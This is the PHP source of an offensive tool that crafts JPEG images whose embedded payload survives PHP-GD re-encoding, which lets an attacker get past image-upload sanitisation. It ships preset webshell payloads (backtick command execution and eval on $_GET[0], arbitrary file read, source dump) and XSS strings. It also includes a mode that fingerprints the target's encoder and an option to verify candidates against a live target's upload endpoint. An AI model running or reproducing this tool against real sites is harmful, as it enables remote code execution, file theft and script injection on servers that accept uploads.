<?php
/*
 * jpg_payload.php - craft a JPEG that still contains a chosen payload string
 * after the server re-encodes it with PHP-GD (imagecreatefromjpeg() +
 * optionally imagecopyresampled() + imagejpeg()).
 *
 * Improved fork of the original jpg_payload.php by Sergey Bobrov (@Black2Fan).
 *
 * What changed vs. the original
 * -----------------------------
 *  - The payload is brute-forced over MANY insertion OFFSETS inside the scan
 *    (entropy-coded) data, not only at the start of the scan. On modern
 *    GD/libjpeg the scan-start-only approach of the original practically never
 *    reproduces the literal after re-encoding - inserting deeper does.
 *  - Every candidate is VERIFIED by actually simulating the server conversion
 *    (decode -> optional resample -> encode) and checking the literal survives.
 *  - Ready-made XSS and PHP presets, automatic JPEG quality detection, optional
 *    base-image generation, a wall-clock budget and clean, bug-free parsing.
 *  - Fixes original bugs: `$dis->readByte` called without `()`, the broken
 *    extraneous-bytes relocation, markers without a length field, etc.
 *
 * How it works
 * ------------
 * The payload bytes are spliced into the Huffman-coded scan stream. libjpeg
 * decodes them as DCT coefficients (producing some garbage blocks) and reports
 * the surplus tail as "extraneous bytes before marker", which we trim so the
 * file stays a clean, decodable JPEG. When the image is re-encoded at the same
 * quality and size, a block that happens to round-trip through quantisation
 * re-emits the very same bytes - the literal payload among them. Whether this
 * happens depends on the image, the offset and the payload, so the tool simply
 * searches until it finds a combination that verifiably survives.
 *
 * SUCCESS DEPENDS ON:
 *   - payload length  -> KEEP IT SHORT. ~13 bytes (<?=phpinfo();) is reliable,
 *                        30+ bytes often cannot be placed. Use the shortest
 *                        bootstrap you can and fetch the rest at runtime.
 *   - quality         -> higher is easier. Match the TARGET's quality exactly.
 *   - dimensions      -> the target must not resize. Best base image: upload any
 *                        JPEG to the target, download the processed result and
 *                        feed THAT here (quality + size then match by design).
 *
 * Usage: php jpg_payload.php -h
 */

const PRESETS = [
    // PHP (target must execute the file as PHP: LFI, .htaccess, etc.).
    // The PHP tag is closed so the surrounding binary is treated as plain
    // output, not code - otherwise the trailing bytes cause a parse error.
    'phpinfo'  => '<?=phpinfo()?>',
    'system'   => '<?=`$_GET[0]`?>',           // shell via ?0=<cmd> (needs shell funcs)
    'eval'     => '<?=eval($_GET[0])?>',        // PHP via ?0=<code>; shell-free, bypasses disable_functions
    'read'     => '<?=readfile($_GET[0])?>',    // dump a file via ?0=/path; shell-free
    'src'      => '<?=highlight_file($_GET[0])?>', // dump source via ?0=/path; shell-free
    // XSS (target must serve the file as HTML / allow sniffing)
    'xss'      => '<svg onload=alert(1)>',
    'xss-img'  => '<img src=x onerror=alert(1)>',
    'xss-dom'  => '<svg onload=alert(document.domain)>',
];

main($argv);

function usage(): never
{
    $presets = '';
    foreach (PRESETS as $name => $p) {
        $presets .= sprintf("      %-8s (%2d B)  %s\n", $name, strlen($p), $p);
    }
    fwrite(STDERR, <<<TXT
jpg_payload.php - craft a JPEG whose payload survives PHP-GD re-encoding.

Usage: php jpg_payload.php [options] <base.jpg>
       php jpg_payload.php [options] --gen WxH

Options:
  -p, --payload <preset|string>  payload (default: phpinfo). Presets:
$presets
  -f, --payload-file <file>      read the raw payload from a file
  -o, --output <file>            output path (default: payload_<base name>)
  -q, --quality <1-100>          quality the TARGET uses (default: auto-detect
                                 from the base image, else 90)
      --sim <resample|direct|both>
                                 conversion to simulate (default: resample).
                                 imagecopyresampled()/resized() -> resample;
                                 plain imagejpeg() -> direct; both -> survive both
      --analyze <processed.jpg>  inspect a JPEG the TARGET produced and print the
                                 exact oracle + generate commands to match it,
                                 then exit (detects size, quality, subsampling,
                                 baseline/progressive and libjpeg version)
      --gen <WxH>                generate base images instead of supplying one
      --oracle <cmd>             VERIFY with the TARGET's own encoder instead of
                                 the local libjpeg. REQUIRED when the target's
                                 libjpeg differs from the local one (e.g. target
                                 "IJG JPEG v80" vs local v62). The command reads
                                 a JPEG from {in} (or stdin) and must write the
                                 converted JPEG to {out} (or stdout). With an
                                 oracle, --sim and -q no longer affect verifying.
      --rounds <n>               survive n successive conversions (default 1)
      --max-pad <n>              max NUL padding after the payload (default 12)
      --step <n>                 offset step while scanning the scan data (default 1)
      --budget <sec>             wall-clock search budget (default 60)
  -v, --verbose
  -h, --help

Tip: the payload must contain NO 0xFF byte, and the shorter it is the better.
For PHP, bootstrap tiny and pull the rest at runtime, e.g. -p '<?=`\$_GET[0]`;'.

Matching the target encoder (libjpeg version matters!):
  The injected bytes must be a fixed point of the TARGET's decode->encode cycle,
  so verifying with a different libjpeg finds payloads that won't survive. Make
  --oracle run the same conversion as the target. Supply a base image that was
  already processed by the target so dimensions and quality match exactly.

  # Docker container whose GD matches the target's "IJG JPEG v80":
  php jpg_payload.php --gen 128x128 -p phpinfo \\
    --oracle 'docker run --rm -i php:8.2-cli php -r '"'"'\$i=imagecreatefromjpeg("php://stdin");\$w=imagesx(\$i);\$h=imagesy(\$i);\$d=imagecreatetruecolor(\$w,\$h);imagecopyresampled(\$d,\$i,0,0,0,0,\$w,\$h,\$w,\$h);imagejpeg(\$d,"php://stdout",90);'"'"''

  # Live target as the oracle (slow; keep the payload short and the budget high):
  php jpg_payload.php target_processed.jpg -p phpinfo --budget 600 \\
    --oracle './upload_convert.sh {in} {out}'   # your script: POST {in}, save result to {out}

TXT);
    exit(1);
}

/**
 * Minimal GNU-style argument parser (options may appear anywhere).
 * @return array{0: array<string,string|true>, 1: string[]} options and positionals
 */
function parseArgs(array $args): array
{
    // name => true (flag) | false (takes a value)
    $spec = [
        'p' => false, 'f' => false, 'o' => false, 'q' => false, 'v' => true, 'h' => true,
        'payload' => false, 'payload-file' => false, 'output' => false, 'quality' => false,
        'sim' => false, 'gen' => false, 'rounds' => false, 'max-pad' => false,
        'step' => false, 'budget' => false, 'oracle' => false, 'analyze' => false,
        'verbose' => true, 'help' => true,
    ];
    $opts = [];
    $positional = [];
    for ($i = 0; $i < count($args); $i++) {
        $a = $args[$i];
        if ($a === '--') {
            $positional = array_merge($positional, array_slice($args, $i + 1));
            break;
        }
        if (preg_match('/^--([a-z-]+)(?:=(.*))?$/s', $a, $m)) {
            $name = $m[1];
        } elseif (preg_match('/^-([a-zA-Z])(.*)$/s', $a, $m)) {
            $name = $m[1];
            if ($m[2] !== '') {
                $m[2] = $m[2]; // -q90 style
            } else {
                unset($m[2]);
            }
        } else {
            $positional[] = $a;
            continue;
        }
        if (!array_key_exists($name, $spec)) {
            fail("unknown option: $a (try -h)");
        }
        if ($spec[$name] === true) {            // flag
            $opts[$name] = true;
            continue;
        }
        if (isset($m[2])) {                      // value attached (--x=v or -xv)
            $opts[$name] = $m[2];
        } elseif ($i + 1 < count($args)) {       // value in next token
            $opts[$name] = $args[++$i];
        } else {
            fail("option $a requires a value");
        }
    }
    return [$opts, $positional];
}

function main(array $argv): void
{
    if (!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        fail('php-gd with JPEG support is required');
    }
    ini_set('gd.jpeg_ignore_warning', '0'); // we rely on libjpeg warnings

    // Own parser: unlike getopt(), options may appear anywhere, including after
    // the <base.jpg> positional argument.
    [$opts, $positional] = parseArgs(array_slice($argv, 1));
    $opt = fn(string $s, string $l, $def = null) => $opts[$l] ?? $opts[$s] ?? $def;

    if (isset($opts['h']) || isset($opts['help'])) {
        usage();
    }
    $GLOBALS['verbose'] = isset($opts['v']) || isset($opts['verbose']);

    // --analyze: inspect a target-processed JPEG and print the exact commands
    // needed to reproduce the target's encoder and generate a working payload.
    if (isset($opts['analyze'])) {
        analyze($opts['analyze'], $opt('p', 'payload', 'eval'));
    }

    if (count($positional) > 1) {
        fail('unexpected extra arguments: ' . implode(' ', array_slice($positional, 1)));
    }
    $input = $positional[0] ?? null;
    $gen   = $opts['gen'] ?? null;
    if (($input === null) === ($gen === null)) {
        usage(); // need exactly one of <base.jpg> / --gen
    }

    // ---- payload -------------------------------------------------------
    if (($pf = $opt('f', 'payload-file')) !== null) {
        $payload = @file_get_contents($pf);
        if ($payload === false) {
            fail("cannot read payload file: $pf");
        }
    } else {
        $payload = $opt('p', 'payload', 'phpinfo');
        $payload = PRESETS[$payload] ?? $payload;
    }
    if ($payload === '' || str_contains($payload, "\xFF")) {
        fail('payload must be non-empty and contain no 0xFF byte');
    }
    $isPhp = str_contains($payload, '<?');

    // ---- knobs ---------------------------------------------------------
    $sim = $opts['sim'] ?? 'resample';
    if (!in_array($sim, ['resample', 'direct', 'both'], true)) {
        fail('--sim must be resample, direct or both');
    }
    $rounds = max(1, (int)($opts['rounds'] ?? 1));
    $maxPad = max(0, (int)($opts['max-pad'] ?? 12));
    $step   = max(1, (int)($opts['step'] ?? 1));
    $budget = max(1, (float)($opts['budget'] ?? 60));

    // Oracle: verify/normalise with the TARGET's own encoder instead of the
    // local libjpeg. Essential when the target's libjpeg version differs from
    // ours (e.g. target "IJG JPEG v80" vs local v62) - a payload that is a
    // round-trip fixed point under one libjpeg is usually not under another.
    $GLOBALS['oracle'] = $opts['oracle'] ?? null;
    if ($GLOBALS['oracle'] !== null) {
        selfTestOracle($GLOBALS['oracle']);
        $sim = 'direct'; // the oracle defines the conversion; sim/quality unused
    }

    $quality = $opt('q', 'quality');
    if ($quality !== null) {
        $quality = (int)$quality;
        if ($quality < 1 || $quality > 100) {
            fail('quality must be 1-100');
        }
    }

    // ---- base images ---------------------------------------------------
    if ($gen !== null) {
        if (!preg_match('/^(\d+)x(\d+)$/i', $gen, $m) || $m[1] < 16 || $m[2] < 16) {
            fail('--gen expects WxH, min 16x16, e.g. 128x128');
        }
        $quality ??= 90;
        $w = (int)$m[1];
        $h = (int)$m[2];
        $bases = (function () use ($w, $h, $quality) {
            for ($seed = 1; ; $seed++) {
                yield "generated #$seed" => normalise(generateImage($w, $h, $seed), $quality);
            }
        })();
        $outName = $opt('o', 'output', 'payload.jpg');
    } else {
        $data = @file_get_contents($input);
        if ($data === false) {
            fail("cannot read file: $input");
        }
        if (decode($data)[0] === null) {
            fail('base image cannot be decoded by GD');
        }
        $detected = detectQuality($data);
        if ($quality === null) {
            $quality = $detected ?? 90;
            info($detected !== null ? "detected quality: $quality" : 'quality not detected, assuming 90');
        } elseif ($detected !== null && $detected !== $quality) {
            info("note: base looks like q$detected but q$quality requested");
        }
        // Normalise once so the base is already a GD re-encode at target quality:
        // the payload is then injected into the exact byte stream GD will emit.
        $bases = ['base' => normalise($data, $quality)];
        $outName = $opt('o', 'output', dirname($input) . '/payload_' . basename($input));
    }

    info(sprintf('payload (%d B): %s', strlen($payload), printable($payload)));
    if ($GLOBALS['oracle'] !== null) {
        info("verifier: external oracle (target encoder) rounds=$rounds max-pad=$maxPad step=$step budget={$budget}s");
    } else {
        info("verifier: local libjpeg (" . localIjgVersion() . ") quality=$quality sim=$sim rounds=$rounds max-pad=$maxPad step=$step budget={$budget}s");
        warnVersionMismatch($input === null ? null : ($data ?? null));
    }
    if (strlen($payload) > 20) {
        info('warning: payload is long (>20 B); survival is unlikely - consider a shorter one');
    }

    // ---- search --------------------------------------------------------
    $deadline = microtime(true) + $budget;
    $tries = 0;
    foreach ($bases as $name => $base) {
        if ($base === null || microtime(true) > $deadline) {
            if (microtime(true) > $deadline) {
                break;
            }
            continue;
        }
        [$sos, $eoi] = scanBounds($base);
        if ($sos === null) {
            vinfo("$name: no SOS marker, skipping");
            continue;
        }
        vinfo(sprintf('%s: scan %d..%d (%d B)', $name, $sos, $eoi, $eoi - $sos));

        // With generated bases there are infinitely many, so cap time per image
        // and move on (survivors are image-specific). With a supplied base image
        // there is only one, so spend the whole remaining budget on it.
        $imgDeadline = $gen !== null
            ? min($deadline, microtime(true) + max(8.0, $budget / 3))
            : $deadline;

        // Deeper offsets round-trip far more often than the scan start, so walk
        // from just inside the scan towards the end.
        for ($off = $sos + 1; $off < $eoi - 1; $off += $step) {
            if (microtime(true) > $deadline) {
                break 2;
            }
            if (microtime(true) > $imgDeadline) {
                break; // next base image
            }
            for ($pad = 0; $pad <= $maxPad; $pad++) {
                $tries++;
                $cand = inject($base, $off, $eoi, $payload . str_repeat("\0", $pad));
                if ($cand === null) {
                    continue;
                }
                if (verify($cand, $payload, $quality, $sim, $rounds, $isPhp) !== true) {
                    continue;
                }
                if (file_put_contents($outName, $cand) === false) {
                    fail("cannot write $outName");
                }
                [$img] = decode($cand);
                info(sprintf('SUCCESS after %d tries (%s, offset=%d, pad=%d)', $tries, $name, $off, $pad));
                info("written: $outName (" . strlen($cand) . " B)");
                if ($GLOBALS['oracle'] !== null) {
                    info(sprintf('verified against the oracle; target must keep %dx%d', imagesx($img), imagesy($img)));
                } else {
                    info(sprintf('target must keep %dx%d and use quality %d (sim: %s)',
                        imagesx($img), imagesy($img), $quality, $sim));
                }
                exit(0);
            }
        }
    }

    @unlink($outName);
    fail(sprintf('no surviving candidate after %d tries / %.1fs. Try: a shorter payload, ' .
        'higher --quality, another/larger base image (or more via --gen), or a bigger --budget.',
        $tries, $budget - ($deadline - microtime(true))));
}

/**
 * Splice $blob into the scan at byte offset $off and trim the surplus tail that
 * libjpeg reports, so the result is a clean, decodable JPEG. Null on failure.
 */
function inject(string $jpeg, int $off, int $eoi, string $blob): ?string
{
    $out = substr($jpeg, 0, $off) . $blob . substr($jpeg, $off);
    $newEoi = $eoi + strlen($blob);

    [$img, $warnings] = decode($out);
    if ($img === null) {
        return null;
    }
    foreach ($warnings as $w) {
        if (preg_match('/(\d+) extraneous bytes before marker 0xd9/i', $w, $m)) {
            $extra = (int)$m[1];
            if ($extra > strlen($blob)) {
                return null; // trimming would eat into the payload
            }
            $out = substr($out, 0, $newEoi - $extra) . substr($out, $newEoi);
            [$img, $warnings] = decode($out);
            break;
        }
    }
    return ($img !== null && $warnings === []) ? $out : null;
}

/** Simulate the target conversion and confirm the literal survives it. */
function verify(string $jpeg, string $payload, int $quality, string $sim, int $rounds, bool $isPhp): bool
{
    $sims = $sim === 'both' ? ['resample', 'direct'] : [$sim];
    foreach ($sims as $mode) {
        $data = $jpeg;
        for ($i = 0; $i < $rounds; $i++) {
            $data = reencode($data, $quality, $mode);
            if ($data === null) {
                return false;
            }
            $pos = strpos($data, $payload);
            if ($pos === false) {
                return false;
            }
            // For PHP, the payload must be the ONLY "<?" in the file: a stray one
            // (before or after) would open a tag over the surrounding binary and
            // make the whole file fail to compile, so the payload never runs.
            if ($isPhp && substr_count($data, '<?') !== substr_count($payload, '<?')) {
                return false;
            }
        }
    }
    return true;
}

function reencode(string $data, int $quality, string $mode): ?string
{
    if ($GLOBALS['oracle'] !== null) {
        return runOracle($GLOBALS['oracle'], $data); // target's own conversion
    }
    [$img] = decode($data);
    if ($img === null) {
        return null;
    }
    if ($mode === 'resample') {
        $w = imagesx($img);
        $h = imagesy($img);
        $dst = imagecreatetruecolor($w, $h);
        imagecopyresampled($dst, $img, 0, 0, 0, 0, $w, $h, $w, $h);
        $img = $dst;
    }
    ob_start();
    imagejpeg($img, null, $quality);
    return ob_get_clean();
}

/**
 * Canonical baseline JPEG: run the source through the SAME encoder the target
 * uses, so the payload is injected into the exact byte stream that encoder
 * emits. With an oracle that is the target encoder; otherwise local GD.
 */
function normalise(string|GdImage $src, int $quality): ?string
{
    if ($GLOBALS['oracle'] !== null) {
        if ($src instanceof GdImage) {
            ob_start();
            imagejpeg($src, null, $quality); // seed bytes; the oracle re-encodes next
            $src = ob_get_clean();
        }
        return runOracle($GLOBALS['oracle'], $src);
    }
    $img = $src instanceof GdImage ? $src : decode($src)[0];
    if ($img === null) {
        return null;
    }
    ob_start();
    imagejpeg($img, null, $quality);
    return ob_get_clean();
}

/**
 * Run the candidate through the external oracle command and return its output.
 * The command receives the input JPEG at the {in} placeholder (or on stdin) and
 * must write the converted JPEG to {out} (or stdout). Returns null on failure.
 */
function runOracle(string $cmd, string $jpeg): ?string
{
    static $in = null, $out = null;
    if ($in === null) {
        $in  = tempnam(sys_get_temp_dir(), 'orc_in');
        $out = tempnam(sys_get_temp_dir(), 'orc_out');
        register_shutdown_function(function () use ($in, $out) {
            @unlink($in);
            @unlink($out);
        });
    }
    file_put_contents($in, $jpeg);
    $usesPlaceholders = str_contains($cmd, '{in}') || str_contains($cmd, '{out}');
    $line = strtr($cmd, ['{in}' => escapeshellarg($in), '{out}' => escapeshellarg($out)]);

    if ($usesPlaceholders) {
        @file_put_contents($out, '');
        exec($line . ' 2>/dev/null', $_, $rc);
        $result = str_contains($cmd, '{out}') ? @file_get_contents($out) : null;
    } else {
        // stdin -> stdout
        $result = shellPipe($line, $jpeg, $rc);
    }
    return ($result !== false && $result !== null && $result !== '') ? $result : null;
}

function shellPipe(string $cmd, string $stdin, &$rc): string|false
{
    $p = proc_open($cmd . ' 2>/dev/null', [0 => ['pipe', 'r'], 1 => ['pipe', 'w']], $pipes);
    if (!is_resource($p)) {
        return false;
    }
    fwrite($pipes[0], $stdin);
    fclose($pipes[0]);
    $out = stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $rc = proc_close($p);
    return $out;
}

/** Sanity-check the oracle once: a valid JPEG in must yield a valid JPEG out. */
function selfTestOracle(string $cmd): void
{
    $probe = imagecreatetruecolor(32, 32);
    for ($i = 0; $i < 20; $i++) {
        imagefilledellipse($probe, rand(0, 32), rand(0, 32), rand(5, 20), rand(5, 20), rand(0, 0xFFFFFF));
    }
    ob_start();
    imagejpeg($probe, null, 90);
    $jpeg = ob_get_clean();

    $res = runOracle($cmd, $jpeg);
    if ($res === null || substr($res, 0, 2) !== "\xFF\xD8") {
        fail("oracle self-test failed: the command did not return a JPEG.\n" .
            "    The command must read a JPEG from {in} (or stdin) and write the\n" .
            "    converted JPEG to {out} (or stdout). See --help / README.");
    }
    [$img] = decode($res);
    if ($img === null) {
        fail('oracle self-test failed: output is not a decodable JPEG');
    }
    info(sprintf('oracle self-test OK (%d B in -> %d B out, %dx%d)',
        strlen($jpeg), strlen($res), imagesx($img), imagesy($img)));
}

/** IJG version string from GD's own output, e.g. "IJG JPEG v62". */
function localIjgVersion(): string
{
    static $v = null;
    if ($v !== null) {
        return $v;
    }
    ob_start();
    imagejpeg(imagecreatetruecolor(8, 8), null, 90);
    $data = ob_get_clean();
    $v = preg_match('/using (IJG JPEG v\w+)/', $data, $m) ? $m[1] : 'unknown';
    return $v;
}

/** Warn if the base image was encoded by a different libjpeg than the local one. */
function warnVersionMismatch(?string $baseData): void
{
    if ($baseData === null || !preg_match('/using (IJG JPEG v\w+)/', $baseData, $m)) {
        return;
    }
    $local = localIjgVersion();
    if ($m[1] !== $local) {
        info("WARNING: base image was encoded by '{$m[1]}' but this tool verifies with local '{$local}'.");
        info('         A payload tuned to the local libjpeg will almost certainly NOT survive on the');
        info('         target. Use --oracle to verify with the target\'s own encoder (see --help).');
    }
}

/** Find the SOFn marker; @return array{0:int sofMarker, 1:array<int,array{0:int,1:int}> sampling} */
function readSof(string $jpeg): array
{
    $len = strlen($jpeg);
    $pos = 2;
    while ($pos + 4 <= $len && $jpeg[$pos] === "\xFF") {
        $marker = ord($jpeg[$pos + 1]);
        if ($marker === 0x01 || ($marker >= 0xD0 && $marker <= 0xD7)) {
            $pos += 2;
            continue;
        }
        $segLen = unpack('n', $jpeg, $pos + 2)[1];
        // SOF0..SOF15 except DHT(C4), JPG(C8), DAC(CC)
        if ($marker >= 0xC0 && $marker <= 0xCF && !in_array($marker, [0xC4, 0xC8, 0xCC], true)) {
            $nc = ord($jpeg[$pos + 9]);
            $samp = [];
            for ($c = 0; $c < $nc; $c++) {
                $hv = ord($jpeg[$pos + 11 + $c * 3]);
                $samp[$c] = [$hv >> 4, $hv & 0x0F];
            }
            return [$marker, $samp];
        }
        if ($marker === 0xDA) {
            break;
        }
        $pos += 2 + $segLen;
    }
    return [0, []];
}

/**
 * Inspect a target-processed JPEG and print the exact commands to reproduce the
 * target's encoder and generate a surviving payload. $payload is only used to
 * fill the example generate command.
 */
function analyze(string $file, string $payload): never
{
    $d = @file_get_contents($file);
    if ($d === false) {
        fail("cannot read $file");
    }
    [$img] = decode($d);
    if ($img === null) {
        fail("not a decodable JPEG: $file");
    }
    $w = imagesx($img);
    $h = imagesy($img);

    [$sof, $samp] = readSof($d);
    $progressive = $sof === 0xC2;
    $modeName = match ($sof) {
        0xC0 => 'baseline (SOF0)',
        0xC1 => 'extended sequential (SOF1)',
        0xC2 => 'progressive (SOF2)',
        default => sprintf('SOF 0x%02X', $sof),
    };
    $lh = $samp[0][0] ?? 1;
    $lv = $samp[0][1] ?? 1;
    $sample = "{$lh}x{$lv}";
    $subName = match ($sample) {
        '1x1' => '4:4:4 (no chroma subsampling)',
        '2x1' => '4:2:2',
        '1x2' => '4:4:0',
        '2x2' => '4:2:0',
        default => $sample,
    };

    $q = detectQuality($d) ?? 90;
    $ijg = preg_match('/using (IJG JPEG v\w+)/', $d, $m) ? $m[1] : null;
    $local = localIjgVersion();
    $resolvedPayload = PRESETS[$payload] ?? $payload;

    $progFlag = $progressive ? ' -progressive' : '';
    $cjpegFlags = "-quality $q -sample $sample$progFlag";

    fwrite(STDERR, "\n");
    info("analyze: $file");
    info(sprintf('  dimensions : %dx%d  (the target must keep this - do not upload a different size)', $w, $h));
    info('  encoder    : ' . ($ijg ?? 'unknown (no gd-jpeg CREATOR comment)')
        . ($ijg && $ijg !== $local ? "  [local tool uses $local -> MISMATCH, an --oracle is REQUIRED]"
            : ($ijg ? '  [matches local tool]' : '')));
    info("  quality    : $q");
    info("  mode       : $modeName");
    info("  subsampling: $subName  (luma {$lh}x{$lv})");
    fwrite(STDERR, "\n");
    info('Reproduce the target encoder with these cjpeg flags:');
    info("    $cjpegFlags");
    fwrite(STDERR, "\n");
    info('Oracle (edit your oracle_v80_local.sh djpeg|cjpeg line to):');
    info("    \"\$DIR/djpeg\" 2>/dev/null | \"\$DIR/cjpeg\" $cjpegFlags 2>/dev/null");
    fwrite(STDERR, "\n");
    info('Oracle via Docker (PHP-GD whose libjpeg matches, e.g. alpine = v80):');
    $interlace = $progressive ? 'imageinterlace($i,true);' : '';
    info("    docker run --rm -i php:8-alpine php -r '"
        . '$i=imagecreatefromstring(stream_get_contents(STDIN));'
        . "$interlace"
        . "imagejpeg(\$i,null,$q);'");
    info('    (note: GD may not reproduce ' . $subName . ' exactly; the cjpeg oracle above matches byte-for-byte)');
    fwrite(STDERR, "\n");
    info('Then generate with (base = this processed image or any image of the same size):');
    info("    php jpg_payload.php " . escapeshellarg($file)
        . " -p " . escapeshellarg($resolvedPayload) . " --oracle ./oracle_v80_local.sh --budget 500 -o payload.jpg");
    if ($progressive) {
        info('  (progressive makes survival harder; keep the payload short and the budget generous)');
    }
    fwrite(STDERR, "\n");
    exit(0);
}

/** @return array{0: ?GdImage, 1: string[]} image (or null) and libjpeg warnings */
function decode(string $data): array
{
    static $tmp = null;
    if ($tmp === null) {
        $tmp = tempnam(sys_get_temp_dir(), 'jpgp');
        register_shutdown_function(fn() => @unlink($tmp));
    }
    file_put_contents($tmp, $data);
    $warnings = [];
    set_error_handler(function (int $no, string $str) use (&$warnings) {
        $warnings[] = trim($str);
        return true;
    });
    try {
        $img = imagecreatefromjpeg($tmp);
    } catch (Throwable $e) {
        $img = false;
        $warnings[] = $e->getMessage();
    } finally {
        restore_error_handler();
    }
    return [$img ?: null, $warnings];
}

/** @return array{0: ?int, 1: int} start-of-scan-data offset and EOI offset */
function scanBounds(string $jpeg): array
{
    $len = strlen($jpeg);
    $eoi = strrpos($jpeg, "\xFF\xD9");
    $eoi = $eoi === false ? $len : $eoi;
    if ($len < 4 || substr($jpeg, 0, 2) !== "\xFF\xD8") {
        return [null, $eoi];
    }
    $pos = 2;
    while ($pos + 4 <= $len) {
        if ($jpeg[$pos] !== "\xFF") {
            return [null, $eoi];
        }
        $marker = ord($jpeg[$pos + 1]);
        if ($marker === 0xFF) {            // fill byte
            $pos++;
            continue;
        }
        if ($marker === 0x01 || ($marker >= 0xD0 && $marker <= 0xD7)) { // no length field
            $pos += 2;
            continue;
        }
        $segLen = unpack('n', $jpeg, $pos + 2)[1];
        if (in_array($marker, [0xC2, 0xC6, 0xCA, 0xCE], true)) {
            vinfo('note: progressive base image; GD writes baseline - already normalised here');
        }
        if ($marker === 0xDA) {
            return [$pos + 2 + $segLen, $eoi];
        }
        $pos += 2 + $segLen;
    }
    return [null, $eoi];
}

/** Quality from GD's comment, else by matching DQT tables against GD's output. */
function detectQuality(string $jpeg): ?int
{
    if (preg_match('/quality = (\d+)/', $jpeg, $m)) {
        return (int)$m[1];
    }
    $dqt = extractDqt($jpeg);
    if ($dqt === null) {
        return null;
    }
    $probe = imagecreatetruecolor(16, 16);
    for ($q = 100; $q >= 1; $q--) {
        ob_start();
        imagejpeg($probe, null, $q);
        if (extractDqt(ob_get_clean()) === $dqt) {
            return $q;
        }
    }
    return null;
}

function extractDqt(string $jpeg): ?string
{
    $len = strlen($jpeg);
    $pos = 2;
    $tables = '';
    while ($pos + 4 <= $len && $jpeg[$pos] === "\xFF") {
        $marker = ord($jpeg[$pos + 1]);
        if ($marker === 0x01 || ($marker >= 0xD0 && $marker <= 0xD7)) {
            $pos += 2;
            continue;
        }
        $segLen = unpack('n', $jpeg, $pos + 2)[1];
        if ($marker === 0xDB) {
            $tables .= substr($jpeg, $pos + 4, $segLen - 2);
        }
        if ($marker === 0xDA) {
            break;
        }
        $pos += 2 + $segLen;
    }
    return $tables === '' ? null : $tables;
}

/**
 * Moderately textured image (overlapping coloured ellipses). This mid-detail
 * content produces scan data in which surviving offsets are common - flat or
 * pure-noise images both work much worse.
 */
function generateImage(int $w, int $h, int $seed): GdImage
{
    mt_srand($seed);
    $img = imagecreatetruecolor($w, $h);
    $blobs = max(20, (int)(($w * $h) / 400));
    for ($i = 0; $i < $blobs; $i++) {
        imagefilledellipse(
            $img,
            mt_rand(0, $w), mt_rand(0, $h),
            mt_rand(8, (int)($w / 2) + 8), mt_rand(8, (int)($h / 2) + 8),
            (mt_rand(0, 255) << 16) | (mt_rand(0, 255) << 8) | mt_rand(0, 255)
        );
    }
    mt_srand();
    return $img;
}

function printable(string $s): string
{
    return addcslashes($s, "\0..\37\177..\377");
}

function info(string $m): void
{
    fwrite(STDERR, "[*] $m\n");
}

function vinfo(string $m): void
{
    if (!empty($GLOBALS['verbose'])) {
        fwrite(STDERR, "[.] $m\n");
    }
}

function fail(string $m): never
{
    fwrite(STDERR, "[-] $m\n");
    exit(1);
}
